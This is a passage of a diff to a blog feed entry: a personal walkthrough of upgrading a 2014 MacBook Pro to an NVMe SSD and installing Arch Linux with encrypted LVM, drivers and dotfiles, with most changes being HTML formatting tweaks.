+&lt;h1 id=&#34;Introduction&#34;&gt;&lt;a href=&#34;#Introduction&#34; class=&#34;headerlink&#34; title=&#34;Introduction&#34;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;The only laptop I own is Apple’s &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zdXBwb3J0LmFwcGxlLmNvbS9rYi9zcDcwND9sb2NhbGU9ZW5fVVM=&#34;&gt;MacBook Pro Retina 15” (late 2014)&lt;/span&gt;, on which I’ve run Gentoo Linux for about three years. Recently, I replaced my MacBook’s SSD with &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2Ftc3VuZy5jb20vc2VtaWNvbmR1Y3Rvci9taW5pc2l0ZS9zc2QvcHJvZHVjdC9jb25zdW1lci85NzBldm9wbHVzLw==&#34;&gt;Samsung’s 970 EVO Plus NVMe M.2 SSD (1TB)&lt;/span&gt; and decided to install Arch Linux on it.&lt;/p&gt;
+&lt;h1 id=&#34;Back-Up-the-Old-SSD&#34;&gt;&lt;a href=&#34;#Back-Up-the-Old-SSD&#34; class=&#34;headerlink&#34; title=&#34;Back Up the Old SSD&#34;&gt;&lt;/a&gt;Back Up the Old SSD&lt;/h1&gt;&lt;p&gt;I booted into a &lt;code&gt;Gentoo Live USB&lt;/code&gt; and used &lt;code&gt;dd&lt;/code&gt; to back up my entire old SSD to an image file.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ dd if=/dev/sda of=/mnt/external_drive/old_ssd.img bs=4M
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Later on, after the new NVMe M.2 SSD has been installed, I could mount my external hard drive on  &lt;code&gt;/mnt/external_drive&lt;/code&gt;  and run the following commands to copy all my data from the image file to the new SSD. The only drawback of this approach is that I have to manually resize the partitions later.&lt;/p&gt;
+&lt;p&gt;Later on, after the new NVMe M.2 SSD has been installed, I could mount my external hard drive on &lt;code&gt;/mnt/external_drive&lt;/code&gt; and run the following commands to copy all my data from the image file to the new SSD. The only drawback of this approach is that I have to manually resize the partitions later.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ dd if=/mnt/external_drive/old_ssd.img of=/dev/nvme0n1 bs=4M
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;firmware-upgrade&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#firmware-upgrade&#34;&gt;#&lt;/a&gt; Firmware Upgrade&lt;/h1&gt;
-&lt;p&gt;Before installing NVMe M.2 SSD on your MacBook, make sure that you’ve upgraded to &lt;strong&gt;macOS Mojave which includes the firmware required to boot from NVMe M.2 SSD&lt;/strong&gt;.&lt;/p&gt;
-&lt;h1 id=&#34;ssd-upgrade&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssd-upgrade&#34;&gt;#&lt;/a&gt; SSD Upgrade&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;CAUTION&lt;/strong&gt;&lt;br&gt;&lt;br&gt;
-Be very careful with the screws. I stripped some of my screws due to the bloated batteries, and ended up spending $3000 NTD (approx. $100 USD) for repairment.&lt;/p&gt;
+&lt;h1 id=&#34;Firmware-Upgrade&#34;&gt;&lt;a href=&#34;#Firmware-Upgrade&#34; class=&#34;headerlink&#34; title=&#34;Firmware Upgrade&#34;&gt;&lt;/a&gt;Firmware Upgrade&lt;/h1&gt;&lt;p&gt;Before installing NVMe M.2 SSD on your MacBook, make sure that you’ve upgraded to &lt;strong&gt;macOS Mojave which includes the firmware required to boot from NVMe M.2 SSD&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;SSD-Upgrade&#34;&gt;&lt;a href=&#34;#SSD-Upgrade&#34; class=&#34;headerlink&#34; title=&#34;SSD Upgrade&#34;&gt;&lt;/a&gt;SSD Upgrade&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;CAUTION&lt;/strong&gt;&lt;br&gt;&lt;br&gt;Be very careful with the screws. I stripped some of my screws due to the bloated batteries, and ended up spending $3000 NTD (approx. $100 USD) for repairment.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;After upgrading to macOS Mojave, your MacBook should be able to recognize NVMe M.2 SSD from now on. Now we can remove the screws on its back and install the new SSD. I bought the Screwdrivers + SSD Adapter on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Nob3BlZS50dw==&#34;&gt;shopee.tw&lt;/span&gt; -&amp;gt; &lt;a href=&#34;https://shopee.tw/product/4848951/1501356237&#34;&gt;&lt;strong&gt;Link&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;After upgrading to macOS Mojave, your MacBook should be able to recognize NVMe M.2 SSD from now on. Now we can remove the screws on its back and install the new SSD. I bought the Screwdrivers + SSD Adapter on shopee.tw -&amp;gt; &lt;a href=&#34;https://shopee.tw/product/4848951/1501356237&#34;&gt;&lt;strong&gt;Link&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;swap.jpg&#34; alt=&#34;swap&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;ssd-data-migration&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssd-data-migration&#34;&gt;#&lt;/a&gt; SSD Data Migration&lt;/h1&gt;
-&lt;p&gt;After upgrading my MacBook’s SSD, I installed macOS on it and used it for a week. However, being a long-term GNU/Linux user, I started to miss all that freedom and customizability offered by Linux. Therefore, I decided to go back to Linux again.&lt;/p&gt;
-&lt;p&gt;At first I used  &lt;code&gt;dd&lt;/code&gt;  to clone all my data from the image file to the new SSD. However, this didn’t work for me, since &lt;strong&gt;I didn’t compile support for NVMe M.2 SSD into my gentoo linux kernel&lt;/strong&gt;, so although the disk was successfully migrated, I wasn’t able to boot from it.&lt;/p&gt;
-&lt;h1 id=&#34;prepare-installation-medium&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#prepare-installation-medium&#34;&gt;#&lt;/a&gt; Prepare Installation Medium&lt;/h1&gt;
-&lt;p&gt;Instead of trying to recompile a new linux kernel with NVMe M.2 SSD support, I decided to leave Gentoo Linux this time. Gentoo is a beautiful Linux distribution (if you have time and patience), but after manually compiling all those packages for 3 years on this fucking MacBook, I’ve already become kinda fed up with it.&lt;/p&gt;
+&lt;h1 id=&#34;SSD-Data-Migration&#34;&gt;&lt;a href=&#34;#SSD-Data-Migration&#34; class=&#34;headerlink&#34; title=&#34;SSD Data Migration&#34;&gt;&lt;/a&gt;SSD Data Migration&lt;/h1&gt;&lt;p&gt;After upgrading my MacBook’s SSD, I installed macOS on it and used it for a week. However, being a long-term GNU/Linux user, I started to miss all that freedom and customizability offered by Linux. Therefore, I decided to go back to Linux again.&lt;/p&gt;
+&lt;p&gt;At first I used &lt;code&gt;dd&lt;/code&gt; to clone all my data from the image file to the new SSD. However, this didn’t work for me, since &lt;strong&gt;I didn’t compile support for NVMe M.2 SSD into my gentoo linux kernel&lt;/strong&gt;, so although the disk was successfully migrated, I wasn’t able to boot from it.&lt;/p&gt;
+&lt;h1 id=&#34;Prepare-Installation-Medium&#34;&gt;&lt;a href=&#34;#Prepare-Installation-Medium&#34; class=&#34;headerlink&#34; title=&#34;Prepare Installation Medium&#34;&gt;&lt;/a&gt;Prepare Installation Medium&lt;/h1&gt;&lt;p&gt;Instead of trying to recompile a new linux kernel with NVMe M.2 SSD support, I decided to leave Gentoo Linux this time. Gentoo is a beautiful Linux distribution (if you have time and patience), but after manually compiling all those packages for 3 years on this fucking MacBook, I’ve already become kinda fed up with it.&lt;/p&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9kb3dubG9hZC8=&#34;&gt;Download Arch Linux ISO&lt;/span&gt; and prepare Arch Live USB:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ dd if=/path/to/arch.iso of=/dev/sdX bs=4M
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Power off your MacBook, insert the USB stick, hold  &lt;code&gt;alt/option&lt;/code&gt;  and power it on again. Now you should see the option to boot from Arch Linux Live USB.&lt;/p&gt;
-&lt;h1 id=&#34;base-installation&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base-installation&#34;&gt;#&lt;/a&gt; Base Installation&lt;/h1&gt;
-&lt;p&gt;After booting from Arch Linux Live USB, you’ll be logged in as the root user. To get Internet connection, I simply plugged my Android phone into my Macbook simply via USB cable, turned on  &lt;code&gt;USB Tethering&lt;/code&gt; , and ran:&lt;/p&gt;
+&lt;p&gt;Power off your MacBook, insert the USB stick, hold &lt;code&gt;alt/option&lt;/code&gt; and power it on again. Now you should see the option to boot from Arch Linux Live USB.&lt;/p&gt;
+&lt;h1 id=&#34;Base-Installation&#34;&gt;&lt;a href=&#34;#Base-Installation&#34; class=&#34;headerlink&#34; title=&#34;Base Installation&#34;&gt;&lt;/a&gt;Base Installation&lt;/h1&gt;&lt;p&gt;After booting from Arch Linux Live USB, you’ll be logged in as the root user. To get Internet connection, I simply plugged my Android phone into my Macbook simply via USB cable, turned on &lt;code&gt;USB Tethering&lt;/code&gt;, and ran:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ dhcpcd
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Ensure the clock is accurate:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ timedatectl set-ntp true
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Run  &lt;code&gt;cfdisk /dev/nvme0n1&lt;/code&gt;  and partition the new SSD as follows:&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;cfdisk /dev/nvme0n1&lt;/code&gt; and partition the new SSD as follows:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;                                   Disk: /dev/nvme0n1
                  Size: 931.53 GiB, 1000204886016 bytes, 1953525168 sectors
                 Label: gpt, identifier: 85CF6A21-FC5C-408D-8532-8751C80F0593
@@ -287,7 +371,7 @@ Device                 Start          End        Sectors        Size Type
 /dev/nvme0n1p1          2048       411647         409600        200M EFI System             
 /dev/nvme0n1p2       411648    1953525134     1953113487      931.3G Linux filesystem
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Now run  &lt;code&gt;lsblk&lt;/code&gt;  and you’ll see something like this:&lt;/p&gt;
+&lt;p&gt;Now run &lt;code&gt;lsblk&lt;/code&gt; and you’ll see something like this:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
 nvme0n1            259:0    0 931.5G  0 disk  
 ├─nvme0n1p1        259:1    0   200M  0 part  
@@ -305,7 +389,7 @@ root$ mkfs.fat -F32 /dev/nvme0n1p1
 root$ mkfs.ext4 /dev/mapper/vgcrypt-root
 root$ mkfs.ext4 /dev/mapper/vgcrypt-home
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Now run  &lt;code&gt;lsblk&lt;/code&gt;  again and you’ll see something like this:&lt;/p&gt;
+&lt;p&gt;Now run &lt;code&gt;lsblk&lt;/code&gt; again and you’ll see something like this:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
 nvme0n1            259:0    0 931.5G  0 disk  
 ├─nvme0n1p1        259:1    0   200M  0 part  
@@ -326,20 +410,19 @@ root$ mount /dev/nvme0n1p1 /mnt/boot
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Generate fstab:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;code&gt;-L&lt;/code&gt;  generates the fstab with labels instead of UUIDs since we’re using encrypted LVM disk.&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;  prevents pseudo-filesystems from being added.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-L&lt;/code&gt; generates the fstab with labels instead of UUIDs since we’re using encrypted LVM disk.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; prevents pseudo-filesystems from being added.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;root$ genfstab -L -p /mnt &amp;gt;&amp;gt; /mnt/etc/fstab
 root$ cat /mnt/etc/fstab
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;configure-the-new-system&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#configure-the-new-system&#34;&gt;#&lt;/a&gt; Configure the New System&lt;/h1&gt;
-&lt;p&gt;Chroot into our new system:&lt;/p&gt;
+&lt;h1 id=&#34;Configure-the-New-System&#34;&gt;&lt;a href=&#34;#Configure-the-New-System&#34; class=&#34;headerlink&#34; title=&#34;Configure the New System&#34;&gt;&lt;/a&gt;Configure the New System&lt;/h1&gt;&lt;p&gt;Chroot into our new system:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ arch-chroot /mnt /bin/bash
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Generate locales:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;uncomment the locales you’re going to use in /etc/locale.gen, and run  &lt;code&gt;locale-gen&lt;/code&gt; .&lt;/li&gt;
-&lt;li&gt;run  &lt;code&gt;echo LANG=en_US.UTF-8 &amp;gt; /etc/locale.conf&lt;/code&gt;  to make ENG UTF-8 the default locale.&lt;/li&gt;
+&lt;li&gt;uncomment the locales you’re going to use in /etc/locale.gen, and run &lt;code&gt;locale-gen&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;run &lt;code&gt;echo LANG=en_US.UTF-8 &amp;gt; /etc/locale.conf&lt;/code&gt; to make ENG UTF-8 the default locale. &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Replace the default console font with terminus:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ pacman -S terminus-font
@@ -349,10 +432,10 @@ root$ echo FONT=ter-v24n &amp;gt; /etc/vconsole.conf
 &lt;pre&gt;&lt;code&gt;root$ ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime
 root$ hwclock --systohc --utc
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;To ensure the kernel loads the proper modules to decrypt root disk at startup, we have to add necessary hooks in  &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt; :&lt;/p&gt;
+&lt;p&gt;To ensure the kernel loads the proper modules to decrypt root disk at startup, we have to add necessary hooks in &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt;:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;HOOKS=&amp;quot;base udev autodetect keyboard keymap modconf block consolefont encrypt lvm2 filesystems fsck&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Regenerate the initramfs image to EFI Partition ( &lt;code&gt;/dev/nvme0n1p1&lt;/code&gt; ):&lt;/p&gt;
+&lt;p&gt;Regenerate the initramfs image to EFI Partition (&lt;code&gt;/dev/nvme0n1p1&lt;/code&gt;):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ mkinitcpio -p linux
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Set hostname:&lt;/p&gt;
@@ -362,11 +445,11 @@ root$ hwclock --systohc --utc
 &lt;pre&gt;&lt;code&gt;root$ pacman -S dosfstools
 root$ bootctl --path=/boot install
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Add an boot entry for systemd-boot by editing  &lt;code&gt;/boot/loader/entries/arch.conf&lt;/code&gt; :&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;title	Arch Linux
-linux	/vmlinuz-linux
-initrd	/initramfs-linux.img
-options	cryptdevice=/dev/nvme0n1p2:vgcrypt root=/dev/mapper/vgcrypt-root rw
+&lt;p&gt;Add an boot entry for systemd-boot by editing &lt;code&gt;/boot/loader/entries/arch.conf&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;title    Arch Linux
+linux    /vmlinuz-linux
+initrd    /initramfs-linux.img
+options    cryptdevice=/dev/nvme0n1p2:vgcrypt root=/dev/mapper/vgcrypt-root rw
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Change root user’s password:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root$ passwd
@@ -383,11 +466,10 @@ root$ passwd aesophor
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Set up sudo:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;run  &lt;code&gt;visudo&lt;/code&gt;  and uncomment the line  &lt;code&gt;%wheel ALL=(ALL) ALL&lt;/code&gt; .&lt;/li&gt;
+&lt;li&gt;run &lt;code&gt;visudo&lt;/code&gt; and uncomment the line &lt;code&gt;%wheel ALL=(ALL) ALL&lt;/code&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;At this point, you may logout the root user and re-login with your unprivileged user.&lt;/p&gt;
-&lt;h1 id=&#34;post-installation&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#post-installation&#34;&gt;#&lt;/a&gt; Post Installation&lt;/h1&gt;
-&lt;p&gt;Install &lt;a href=&#34;https://github.com/Jguer/yay&#34;&gt; &lt;code&gt;yay&lt;/code&gt; &lt;/a&gt;, an AUR helper:&lt;/p&gt;
+&lt;h1 id=&#34;Post-Installation&#34;&gt;&lt;a href=&#34;#Post-Installation&#34; class=&#34;headerlink&#34; title=&#34;Post Installation&#34;&gt;&lt;/a&gt;Post Installation&lt;/h1&gt;&lt;p&gt;Install &lt;a href=&#34;https://github.com/Jguer/yay&#34;&gt;&lt;code&gt;yay&lt;/code&gt;&lt;/a&gt;, an AUR helper:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ git clone https://aur.archlinux.org/yay.git
 user$ cd yay
 user$ sudo makepkg -si
@@ -397,15 +479,15 @@ user$ sudo makepkg -si
 user$ yay -S opencl-intel
 user$ sudo pacman -S xorg-server xorg-xinit xorg-apps
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Install  &lt;code&gt;xf86-input-mtrack&lt;/code&gt;  as our trackpad driver:&lt;/p&gt;
+&lt;p&gt;Install &lt;code&gt;xf86-input-mtrack&lt;/code&gt; as our trackpad driver:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ yay -S xf86-input-mtrack
 user$ sudo wget -O /etc/X11/xorg.conf.d/10-mtrack.conf https://raw.githubusercontent.com/aesophor/macbookpro-11-2-gentoo-config/master/etc/X11/xorg.conf.d/10mtrack.conf
 user$ sudo gpasswd -a aesophor input
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Install  &lt;code&gt;broadcom-wl-dkms&lt;/code&gt;  as our Wi-Fi driver (my laptop model is A1398):&lt;/p&gt;
+&lt;p&gt;Install &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; as our Wi-Fi driver (my laptop model is A1398):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ sudo pacman -S dkms broadcom-wl-dkms
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Install  &lt;code&gt;bcwc-pcie-git&lt;/code&gt;  as our FaceTimeHD webcam driver:&lt;/p&gt;
+&lt;p&gt;Install &lt;code&gt;bcwc-pcie-git&lt;/code&gt; as our FaceTimeHD webcam driver:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ yay -S bcwc-pcie-git
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Install font packages:&lt;/p&gt;
@@ -423,7 +505,7 @@ user$ yay -S wmderland-git polybar dunst picom rofi-git rxvt-unicode firefox
 &lt;pre&gt;&lt;code&gt;user$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt fcitx5-material-color
 user$ yay -S fcitx5-pinyin-zhwiki
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Downgrade  &lt;code&gt;pango&lt;/code&gt;  to 1.43 since &amp;gt;= 1.44 cause issue with font rendering on rofi:&lt;/p&gt;
+&lt;p&gt;Downgrade &lt;code&gt;pango&lt;/code&gt; to 1.43 since &amp;gt;= 1.44 cause issue with font rendering on rofi:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ sudo pacman -U https://archive.archlinux.org/packages/p/pango/pango-1.43.0-1-x86_64.pkg.tar.xz
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Powersaving:&lt;/p&gt;
@@ -438,8 +520,7 @@ user$ sudo systemctl enable mbpfan.service
 &lt;li&gt;echo “XHC1” &amp;gt; /proc/acpi/wakeup  # fix immediate wakeup after suspension on macbook&lt;/li&gt;
 &lt;li&gt;setpci -v -H1 -s 00:01.00 BRIDGE_CONTROL=0  # enable keyboard backlight control&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1 id=&#34;enter-x11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#enter-x11&#34;&gt;#&lt;/a&gt; Enter X11&lt;/h1&gt;
-&lt;p&gt;Install my dotfiles:&lt;/p&gt;
+&lt;h1 id=&#34;Enter-X11&#34;&gt;&lt;a href=&#34;#Enter-X11&#34; class=&#34;headerlink&#34; title=&#34;Enter X11&#34;&gt;&lt;/a&gt;Enter X11&lt;/h1&gt;&lt;p&gt;Install my dotfiles:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ git clone https://github.com/aesophor/dotfiles.git ~/Dots
 user$ cd ~/Dots
 user$ rm ~/.zshrc ~/.bashrc
@@ -448,8 +529,7 @@ user$ ./.install.sh
 &lt;p&gt;Start an X11 session (GUI) as your unprivileged user:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user$ startx
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Voilà. Now you can go ahead and start customizing it!&lt;br&gt;
-&lt;img data-src=&#34;result.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Voilà. Now you can go ahead and start customizing it!&lt;br&gt;&lt;img data-src=&#34;result.png&#34;&gt;&lt;/p&gt;
 </content>
         <category term="linux" />
         <updated>2020-07-20T10:48:46.000Z</updated>
